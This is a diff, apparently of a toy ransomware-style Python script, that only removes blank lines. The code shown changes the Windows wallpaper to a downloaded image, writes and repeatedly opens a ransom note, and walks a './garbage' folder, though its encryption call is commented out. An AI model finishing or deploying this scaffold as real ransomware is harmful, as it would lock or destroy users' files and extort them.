@@ -4,9 +4,7 @@ import os
 import subprocess
 import time
 import urllib.request
-
 import pyautogui
-
 
 def menu():
     choice = pyautogui.prompt("""
@@ -18,7 +16,6 @@ def menu():
     pyautogui.confirm('Yeah i need help')
     pyautogui.countdown(5)
 
-
 def change_desktop_background():
     imageUrl = 'https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse2.mm.bing.net%2Fth%3Fid%3DOIP.7FXKvbyxPuM8Ce_761LXlAHaEH%26pid%3DApi&f=1'
     path = f'background-a.jpg'
@@ -29,7 +26,6 @@ def change_desktop_background():
     SPI_SETDESKWALLPAPER = 20
     # TODO verify path
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, location, 0)
-
 
 def create_ransom_note():
     date = datetime.date.today().strftime('%d-%B-Y')
@@ -77,7 +73,6 @@ def create_ransom_note():
 ''')
     f.close()
 
-
 def show_ransom_note():
     ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
     count = 0
@@ -89,7 +84,6 @@ def show_ransom_note():
         if count == 5:
             break
 
-
 def encrypt_directory():
     dirname = './garbage'
     for path, dirnames, files in os.walk(dirname):
@@ -97,7 +91,6 @@ def encrypt_directory():
             filePath = os.path.join(path, file)
             print(f'Encrypting File {filePath}')
             # encrypt_file(filePath)
-
 
 menu()
 change_desktop_background()
